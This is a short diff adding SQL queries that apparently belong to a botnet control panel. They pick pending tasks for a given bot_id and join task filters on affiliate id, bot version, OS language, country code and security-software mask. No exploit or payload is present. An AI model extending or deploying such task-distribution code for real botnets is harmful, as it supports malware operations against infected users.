@@ -1,0 +1,20 @@
+"SELECT t.id, t.bundle_id, t.group_id, t.bots_accepted FROM tasks t WHERE "
+"(t.paused = 0) AND "
+"(t.min_reg_dt <= %u AND t.max_reg_dt >= %u) AND "
+"(t.bots_limit > t.bots_accepted) AND "
+"(t.group_id NOT IN (SELECT task_group_id from bots_task_groups WHERE bot_id = %llu)) "
+"ORDER BY t.priority LIMIT %u"
+
+SELECT t.id, t.bundle_id, t.group_id, t.bots_accepted FROM tasks t WHERE
+(t.paused = 0) AND
+(t.min_reg_dt <= 1340236800 AND t.max_reg_dt >= 1340236800) AND
+(t.bots_limit > t.bots_accepted) AND
+(t.group_id NOT IN (SELECT task_group_id from bots_task_groups WHERE bot_id = 1))
+ORDER BY t.priority LIMIT 5
+
+
+SELECT f.aff_id, f.sub_id, f.bot_ver, f.os_ver, f.os_lang, f.cc, f.hips_mask, f.ip, f.bot_id FROM tasks_filters tf, filter_names fn, filter_groups fg, filters f WHERE
+(tf.task_id = 1) AND
+(tf.fname_id = fn.id) AND
+(fg.fname_id = fn.id) AND
+(fg.flt_id = f.id)
